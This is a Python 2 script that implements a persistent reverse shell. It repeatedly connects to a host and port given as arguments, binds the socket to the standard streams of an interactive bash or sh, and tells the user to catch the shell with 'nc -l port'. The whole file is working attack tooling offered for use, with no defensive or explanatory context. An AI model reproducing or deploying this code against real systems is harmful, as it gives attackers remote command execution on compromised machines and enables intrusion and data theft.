#!/usr/bin/env python
#coding: utf-8
import socket
import os
import subprocess
import threading
import sys
import errno
import time


def getshell():
    sh = '/bin/sh'
    bash = '/bin/bash'
    if os.path.exists(bash):
        return [bash, "-i"]
    else:
        return [sh, "-i"]


class ReverseShell(threading.Thread):
    def __init__(self, sock):
        super(ReverseShell, self).__init__()
        self.daemon = False
        self.sock = sock

    def run(self):
        os.dup2(self.sock.fileno(), 0)
        os.dup2(self.sock.fileno(), 1)
        os.dup2(self.sock.fileno(), 2)
        subprocess.call(getshell())


class MonitorThread(threading.Thread):
    def __init__(self, target, port):
        super(MonitorThread, self).__init__()
        self.daemon = False
        self.target = target
        self.port = port

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((self.target, self.port))
            except:
                pass
            else:
                Shell = ReverseShell(sock)
                Shell.start()
                Shell.join()
                sock.close()
            time.sleep(0.1)


def usage():
    print """
    Usage: %s target_ip port
    In target machine, use command "nc -l port" to get shell.
    """ % (os.path.realpath(__file__))


if __name__ == '__main__':
    try:
        target = sys.argv[1]
        port = sys.argv[2]
    except IndexError, e:
        usage()
        sys.exit(1)
        if len(sys.argv) <= 1:
            usage()
            sys.exit(1)
    Monitor = MonitorThread(target, int(port))
    Monitor.start()

